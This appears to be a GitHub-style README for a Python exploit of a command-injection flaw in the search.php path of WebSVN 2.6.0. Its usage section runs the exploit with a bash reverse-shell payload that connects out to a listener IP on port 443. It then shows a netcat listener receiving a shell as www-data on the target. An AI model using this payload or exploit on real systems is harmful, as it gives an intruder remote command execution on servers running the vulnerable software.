# CVE-2021-3205-websvn-2.6.0
This is a exploit of CVE-2021-3205 a web vulnerability to command injection on search.php path, this exploit allows execute commands.
# Requirements
optparse, signal, requests
# Usage
```bash
❯ python3 CVE-2021-3205.py --url http://10.0.2.168/websvn/ --payload "bash -c 'bash -i >& /dev/tcp/10.0.2.133/443 0>&1'"

...

❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.0.2.133] from (UNKNOWN) [10.0.2.168] 34174
bash: cannot set terminal process group (357): Inappropriate ioctl for device
bash: no job control in this shell
www-data@agent:~/html/websvn$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@agent:~/html/websvn$ 


```
